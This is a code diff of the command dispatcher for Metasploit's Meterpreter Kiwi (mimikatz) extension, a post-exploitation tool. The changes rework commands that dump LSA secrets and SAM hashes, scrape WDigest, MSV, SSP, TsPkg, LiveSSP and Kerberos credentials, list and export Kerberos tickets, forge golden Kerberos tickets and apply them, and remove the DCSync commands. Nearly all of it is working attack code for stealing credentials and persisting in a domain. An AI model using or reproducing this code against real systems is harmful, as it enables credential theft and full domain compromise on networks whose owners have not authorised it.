@@ -38,8 +38,8 @@ class Console::CommandDispatcher::Kiwi
     super
     print_line
     print_line
-    print_line("  .#####.   mimikatz 2.1 (#{client.session_type})")
-    print_line(" .## ^ ##.  \"A La Vie, A L'Amour\"")
+    print_line("  .#####.   mimikatz 2.0 alpha (#{client.session_type}) release \"Kiwi en C\"")
+    print_line(" .## ^ ##.")
     print_line(" ## / \\ ##  /* * *")
     print_line(" ## \\ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )")
     print_line(" '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)")
@@ -47,8 +47,8 @@ class Console::CommandDispatcher::Kiwi
     print_line
 
     if client.arch == ARCH_X86 and client.sys.config.sysinfo['Architecture'] == ARCH_X64
-      print_warning('Loaded x86 Kiwi on an x64 architecture.')
       print_line
+      print_warning('Loaded x86 Kiwi on an x64 architecture.')
     end
   end
 
@@ -57,84 +57,83 @@ class Console::CommandDispatcher::Kiwi
   #
   def commands
     {
-      'kiwi_cmd'              => 'Execute an arbitary mimikatz command (unparsed)',
-      'dcsync'                => 'Retrieve user account information via DCSync (unparsed)',
-      'dcsync_ntlm'           => 'Retrieve user account NTLM hash, SID and RID via DCSync',
-      'creds_wdigest'         => 'Retrieve WDigest creds (parsed)',
-      'creds_msv'             => 'Retrieve LM/NTLM creds (parsed)',
+      'creds_wdigest'         => 'Retrieve WDigest creds',
+      'creds_msv'             => 'Retrieve LM/NTLM creds (hashes)',
+      'creds_livessp'         => 'Retrieve LiveSSP creds',
       'creds_ssp'             => 'Retrieve SSP creds',
-      'creds_tspkg'           => 'Retrieve TsPkg creds (parsed)',
-      'creds_kerberos'        => 'Retrieve Kerberos creds (parsed)',
-      'creds_all'             => 'Retrieve all credentials (parsed)',
+      'creds_tspkg'           => 'Retrieve TsPkg creds',
+      'creds_kerberos'        => 'Retrieve Kerberos creds',
+      'creds_all'             => 'Retrieve all credentials',
       'golden_ticket_create'  => 'Create a golden kerberos ticket',
       'kerberos_ticket_use'   => 'Use a kerberos ticket',
       'kerberos_ticket_purge' => 'Purge any in-use kerberos tickets',
-      'kerberos_ticket_list'  => 'List all kerberos tickets (unparsed)',
-      'lsa_dump_secrets'      => 'Dump LSA secrets (unparsed)',
-      'lsa_dump_sam'          => 'Dump LSA SAM (unparsed)',
-      'wifi_list'             => 'List wifi profiles/creds',
+      'kerberos_ticket_list'  => 'List all kerberos tickets',
+      'lsa_dump'              => 'Dump LSA secrets',
+      'wifi_list'             => 'List wifi profiles/creds'
     }
-  end
-
-  def cmd_kiwi_cmd(*args)
-    output = client.kiwi.exec_cmd(args.join(' '))
-    print_line(output)
-  end
-
-  def cmd_dcsync(*args)
-    return unless check_is_domain_user
-
-    if args.length != 1
-      print_line('Usage: dcsync <DOMAIN\user>')
-      print_line
-      return
-    end
-
-    print_line(client.kiwi.dcsync(args[0]))
-  end
-
-  def cmd_dcsync_ntlm(*args)
-    return unless check_is_domain_user
-
-    if args.length != 1
-      print_line('Usage: dcsync_ntlm <DOMAIN\user>')
-      print_line
-      return
-    end
-
-    user = args[0]
-    result = client.kiwi.dcsync_ntlm(user)
-    if result
-      print_good("Account   : #{user}")
-      print_good("NTLM Hash : #{result[:ntlm]}")
-      print_good("LM Hash   : #{result[:lm]}")
-      print_good("SID       : #{result[:sid]}")
-      print_good("RID       : #{result[:rid]}")
-    else
-      print_error("Failed to retrieve information for #{user}")
-    end
-    print_line
   end
 
   #
   # Invoke the LSA secret dump on thet target.
   #
-  def cmd_lsa_dump_secrets(*args)
-    return unless check_is_system
+  def cmd_lsa_dump(*args)
+    check_privs
 
     print_status('Dumping LSA secrets')
-    print_line(client.kiwi.lsa_dump_secrets)
+    lsa = client.kiwi.lsa_dump
+
+    # the format of this data doesn't really lend itself nicely to
+    # use within a table so instead we'll dump in a linear fashion
+
+    print_line("Policy Subsystem : #{lsa[:major]}.#{lsa[:minor]}") if lsa[:major]
+    print_line("Domain/Computer  : #{lsa[:compname]}") if lsa[:compname]
+    print_line("System Key       : #{to_hex(lsa[:syskey])}")
+    print_line("NT5 Key          : #{to_hex(lsa[:nt5key])}")
     print_line
-  end
+    print_line("NT6 Key Count    : #{lsa[:nt6keys].length}")
 
-  #
-  # Invoke the LSA SAM dump on thet target.
-  #
-  def cmd_lsa_dump_sam(*args)
-    return unless check_is_system
+    if lsa[:nt6keys].length > 0
+      lsa[:nt6keys].to_enum.with_index(1) do |k, i|
+        print_line
+        index = i.to_s.rjust(2, ' ')
+        print_line("#{index}. ID           : #{Rex::Text::to_guid(k[:id])}")
+        print_line("#{index}. Value        : #{to_hex(k[:value])}")
+      end
+    end
 
-    print_status('Dumping SAM')
-    print_line(client.kiwi.lsa_dump_sam)
+    print_line
+    print_line("Secret Count     : #{lsa[:secrets].length}")
+    if lsa[:secrets].length > 0
+      lsa[:secrets].to_enum.with_index(1) do |s, i|
+        print_line
+        index = i.to_s.rjust(2, ' ')
+        print_line("#{index}. Name         : #{s[:name]}")
+        print_line("#{index}. Service      : #{s[:service]}") if s[:service]
+        print_line("#{index}. NTLM         : #{to_hex(s[:ntlm])}") if s[:ntlm]
+        if s[:current] || s[:current_raw]
+          current = s[:current] || to_hex(s[:current_raw], ' ')
+          print_line("#{index}. Current      : #{current}")
+        end
+        if s[:old] || s[:old_raw]
+          old = s[:old] || to_hex(s[:old_raw], ' ')
+          print_line("#{index}. Old          : #{old}")
+        end
+      end
+    end
+
+    print_line
+    print_line("SAM Key Count    : #{lsa[:samkeys].length}")
+    if lsa[:samkeys].length > 0
+      lsa[:samkeys].to_enum.with_index(1) do |s, i|
+        print_line
+        index = i.to_s.rjust(2, ' ')
+        print_line("#{index}. RID          : #{s[:rid]}")
+        print_line("#{index}. User         : #{s[:user]}")
+        print_line("#{index}. LM Hash      : #{to_hex(s[:lm_hash])}")
+        print_line("#{index}. NTLM Hash    : #{to_hex(s[:ntlm_hash])}")
+      end
+    end
+
     print_line
   end
 
@@ -143,12 +142,12 @@ class Console::CommandDispatcher::Kiwi
   #
   @@golden_ticket_create_opts = Rex::Parser::Arguments.new(
     '-h' => [ false, 'Help banner' ],
-    '-u' => [ true,  'Name of the user to create the ticket for (required)' ],
+    '-u' => [ true,  'Name of the user to create the ticket for' ],
     '-i' => [ true,  'ID of the user to associate the ticket with' ],
     '-g' => [ true,  'Comma-separated list of group identifiers to include (eg: 501,502)' ],
-    '-d' => [ true,  'FQDN of the target domain (required)' ],
+    '-d' => [ true,  'Name of the target domain (FQDN)' ],
     '-k' => [ true,  'krbtgt domain user NTLM hash' ],
-    '-t' => [ true,  'Local path of the file to store the ticket in (required)' ],
+    '-t' => [ true,  'Local path of the file to store the ticket in' ],
     '-s' => [ true,  'SID of the domain' ]
   )
 
@@ -166,73 +165,51 @@ class Console::CommandDispatcher::Kiwi
   # Invoke the golden kerberos ticket creation functionality on the target.
   #
   def cmd_golden_ticket_create(*args)
-
     if args.include?("-h")
       golden_ticket_create_usage
       return
     end
 
-    target_file = nil
-    opts = {
-      user: nil,
-      domain_name: nil,
-      domain_sid: nil,
-      krbtgt_hash: nil,
-      user_id: nil,
-      group_ids: nil
-    }
+    user = nil
+    domain = nil
+    sid = nil
+    tgt = nil
+    target = nil
+    id = 0
+    group_ids = []
 
     @@golden_ticket_create_opts.parse(args) { |opt, idx, val|
       case opt
       when '-u'
-        opts[:user] = val
+        user = val
       when '-d'
-        opts[:domain_name] = val
+        domain = val
       when '-k'
-        opts[:krbtgt_hash] = val
+        tgt = val
       when '-t'
-        target_file = val
+        target = val
       when '-i'
-        opts[:user_id] = val.to_i
+        id = val.to_i
       when '-g'
-        opts[:group_ids] = val
+        group_ids = val.split(',').map { |g| g.to_i }.to_a
       when '-s'
-        opts[:domain_sid] = val
+        sid = val
       end
     }
 
-    # we need the user and domain at the very least
-    unless opts[:user] && opts[:domain_name] && target_file
+    # all parameters are required
+    unless user && domain && sid && tgt && target
       golden_ticket_create_usage
       return
     end
 
-    # is anything else missing?
-    unless opts[:domain_sid] && opts[:krbtgt_hash]
-      return unless check_is_domain_user('Unable to run module as SYSTEM unless krbtgt and domain sid are provided')
+    ticket = client.kiwi.golden_ticket_create(user, domain, sid, tgt, id, group_ids)
 
-      # let's go discover it
-      krbtgt_username = opts[:user].split('\\')[0] + '\\krbtgt'
-      dcsync_result = client.kiwi.dcsync_ntlm(krbtgt_username)
-      unless opts[:krbtgt_hash]
-        opts[:krbtgt_hash] = dcsync_result[:ntlm]
-        print_warning("NTLM hash for krbtgt missing, using #{opts[:krbtgt_hash]} extracted from #{krbtgt_username}")
-      end
-
-      unless opts[:domain_sid]
-        domain_sid = dcsync_result[:sid].split('-')
-        opts[:domain_sid] = domain_sid[0, domain_sid.length - 1].join('-')
-        print_warning("Domain SID missing, using #{opts[:domain_sid]} extracted from SID of #{krbtgt_username}")
-      end
-    end
-
-    ticket = client.kiwi.golden_ticket_create(opts)
-
-    ::File.open(target_file, 'wb') do |f|
+    ::File.open( target, 'wb' ) do |f|
       f.write(ticket)
     end
 
-    print_good("Golden Kerberos ticket written to #{target_file}")
+    print_good("Golden Kerberos ticket written to #{target}")
   end
 
   #
@@ -240,6 +217,8 @@ class Console::CommandDispatcher::Kiwi
   #
   @@kerberos_ticket_list_opts = Rex::Parser::Arguments.new(
     '-h' => [ false, 'Help banner' ],
+    '-e' => [ false, 'Export Kerberos tickets to disk' ],
+    '-p' => [ true,  'Path to export Kerberos tickets to' ]
   )
 
   #
@@ -261,14 +240,63 @@ class Console::CommandDispatcher::Kiwi
       return
     end
 
-    output = client.kiwi.kerberos_ticket_list.strip
-    if output == ''
-      print_error('No kerberos tickets exist in the current session.')
-    else
-      print_good('Kerberos tickets found in the current session.')
-      print_line(output)
+    # default to not exporting
+    export = false
+    # default to the current folder for dumping tickets
+    export_path = '.'
+
+    @@kerberos_ticket_list_opts.parse(args) { |opt, idx, val|
+      case opt
+      when '-e'
+        export = true
+      when '-p'
+        export_path = val
+      end
+    }
+
+    tickets = client.kiwi.kerberos_ticket_list(export)
+
+    fields = ['Server', 'Client', 'Start', 'End', 'Max Renew', 'Flags']
+    fields << 'Export Path' if export
+
+    table = Rex::Text::Table.new(
+      'Header'    => 'Kerberos Tickets',
+      'Indent'    => 0,
+      'SortIndex' => 0,
+      'Columns'   => fields
+    )
+
+    tickets.each do |t|
+      flag_list = client.kiwi.to_kerberos_flag_list(t[:flags]).join(", ")
+      values = [
+        "#{t[:server]} @ #{t[:server_realm]}",
+        "#{t[:client]} @ #{t[:client_realm]}",
+        t[:start],
+        t[:end],
+        t[:max_renew],
+        "#{t[:flags].to_s(16).rjust(8, '0')} (#{flag_list})"
+      ]
+
+      # write out each ticket to disk if export is enabled.
+      if export
+        path = '<no data retrieved>'
+        if t[:raw]
+          id = "#{values[0]}-#{values[1]}".gsub(/[\\\/\$ ]/, '-')
+          file = "kerb-#{id}-#{Rex::Text.rand_text_alpha(8)}.tkt"
+          path = ::File.expand_path(File.join(export_path, file))
+          ::File.open(path, 'wb') do |x|
+            x.write t[:raw]
+          end
+        end
+        values << path
+      end
+
+      table << values
     end
+
     print_line
+    print_line(table.to_s)
+    print_line("Total Tickets : #{tickets.length}")
   end
 
   #
@@ -294,12 +322,9 @@ class Console::CommandDispatcher::Kiwi
       ticket += f.read(f.stat.size)
     end
 
-    print_status("Using Kerberos ticket stored in #{target}, #{ticket.length} bytes ...")
-    if client.kiwi.kerberos_ticket_use(ticket)
-      print_good('Kerberos ticket applied successfully.')
-    else
-      print_error('Kerberos ticket application failed.')
-    end
+    print_status("Using Kerberos ticket stored in #{target}, #{ticket.length} bytes")
+    client.kiwi.kerberos_ticket_use(ticket)
+    print_good('Kerberos ticket applied successfully')
   end
 
   #
@@ -355,7 +380,7 @@ class Console::CommandDispatcher::Kiwi
   # Dump all the possible credentials to screen.
   #
   def cmd_creds_all(*args)
-    method = Proc.new { client.kiwi.creds_all }
+    method = Proc.new { client.kiwi.all_pass }
     scrape_passwords('all', method, args)
   end
 
@@ -363,7 +388,7 @@ class Console::CommandDispatcher::Kiwi
   # Dump all wdigest credentials to screen.
   #
   def cmd_creds_wdigest(*args)
-    method = Proc.new { client.kiwi.creds_wdigest }
+    method = Proc.new { client.kiwi.wdigest }
     scrape_passwords('wdigest', method, args)
   end
 
@@ -371,15 +396,23 @@ class Console::CommandDispatcher::Kiwi
   # Dump all msv credentials to screen.
   #
   def cmd_creds_msv(*args)
-    method = Proc.new { client.kiwi.creds_msv }
+    method = Proc.new { client.kiwi.msv }
     scrape_passwords('msv', method, args)
+  end
+
+  #
+  # Dump all LiveSSP credentials to screen.
+  #
+  def cmd_creds_livessp(*args)
+    method = Proc.new { client.kiwi.livessp }
+    scrape_passwords('livessp', method, args)
   end
 
   #
   # Dump all SSP credentials to screen.
   #
   def cmd_creds_ssp(*args)
-    method = Proc.new { client.kiwi.creds_ssp }
+    method = Proc.new { client.kiwi.ssp }
     scrape_passwords('ssp', method, args)
   end
 
@@ -387,7 +420,7 @@ class Console::CommandDispatcher::Kiwi
   # Dump all TSPKG credentials to screen.
   #
   def cmd_creds_tspkg(*args)
-    method = Proc.new { client.kiwi.creds_tspkg }
+    method = Proc.new { client.kiwi.tspkg }
     scrape_passwords('tspkg', method, args)
   end
 
@@ -395,29 +428,27 @@ class Console::CommandDispatcher::Kiwi
   # Dump all Kerberos credentials to screen.
   #
   def cmd_creds_kerberos(*args)
-    method = Proc.new { client.kiwi.creds_kerberos }
+    method = Proc.new { client.kiwi.kerberos }
     scrape_passwords('kerberos', method, args)
   end
 
 protected
 
-  def check_is_domain_user(msg='Running as SYSTEM, function will not work.')
-    if client.sys.config.is_system?
-      print_warning(msg)
+  def check_privs
+    if system_check
+      print_good('Running as SYSTEM')
+    else
+      print_warning('Not running as SYSTEM, execution may fail')
+    end
+  end
+
+  def system_check
+    unless client.sys.config.is_system?
+      print_warning('Not currently running as SYSTEM')
       return false
     end
 
-    true
-  end
-
-  def check_is_system
-    if client.sys.config.is_system?
-      print_good('Running as SYSTEM')
-      return true
-    end
-
-    print_warning('Not running as SYSTEM, execution may fail')
-    false
+    return true
   end
 
   #
@@ -436,29 +467,30 @@ protected
       return
     end
 
-    return unless check_is_system
+    check_privs
     print_status("Retrieving #{provider} credentials")
     accounts = method.call
-    output = ""
 
-    accounts.keys.each do |k|
+    table = Rex::Text::Table.new(
+      'Header'    => "#{provider} credentials",
+      'Indent'    => 0,
+      'SortIndex' => 0,
+      'Columns'   => [
+        'Domain', 'User', 'Password', 'LM Hash', 'NTLM Hash'
+      ]
+    )
 
-      next if accounts[k].length == 0
-
-      table = Rex::Text::Table.new(
-        'Header'    => "#{k} credentials",
-        'Indent'    => 0,
-        'SortIndex' => 0,
-        'Columns'   => accounts[k][0].keys
-      )
-
-      accounts[k].each do |acct|
-        table << acct.values
-      end
-
-      output << table.to_s + "\n"
+    accounts.each do |acc|
+      table << [
+        acc[:domain] || '',
+        acc[:username] || '',
+        acc[:password] || '',
+        to_hex(acc[:lm]),
+        to_hex(acc[:ntlm])
+      ]
     end
 
+    output = table.to_s
     print_line(output)
 
     # determine if a target file path was passed in
